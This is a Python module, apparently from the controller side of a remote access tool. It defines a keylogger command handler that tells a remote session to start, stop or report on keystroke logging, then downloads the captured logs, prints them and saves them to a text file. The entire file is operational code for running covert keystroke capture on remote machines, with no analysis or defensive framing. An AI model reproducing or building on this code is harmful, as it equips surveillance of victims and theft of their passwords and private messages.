from domestic.parse.error_exception_handling import *
from domestic.utility.validate_dict_key import *
from domestic.session.session_message import *
from domestic.utility.status_message import *
from domestic.make.make_file import *


@error_exception_handling
def keylogger(message):
  run = validate_dict_key(message, 'run')
  download = validate_dict_key(message, 'download')
  close = validate_dict_key(message, 'close')
  status = validate_dict_key(message, 'status')
  quiet = validate_dict_key(message, 'quiet')

  if run:
    message['action_type'] = 'run'
    del message['run']
    session_message(message)
  elif download:
    message['action_type'] = 'download'
    del message['download']
    data = session_message(message, False)

    logs = validate_dict_key(data, 'logs')

    if logs:
      if quiet is None:
        status_message(logs.decode(state['settings']['encoding']), 'raw')
        print()
      make_file(['keylogger'], 'txt', logs, data['message'])
    else:
      status_message(data['message'], data['text_mode'])
  elif close:
    message['action_type'] = 'close'
    del message['close']
    session_message(message)
  elif status:
    message['action_type'] = 'status'
    del message['status']
    session_message(message)
  else:
    raise Exception('Error message')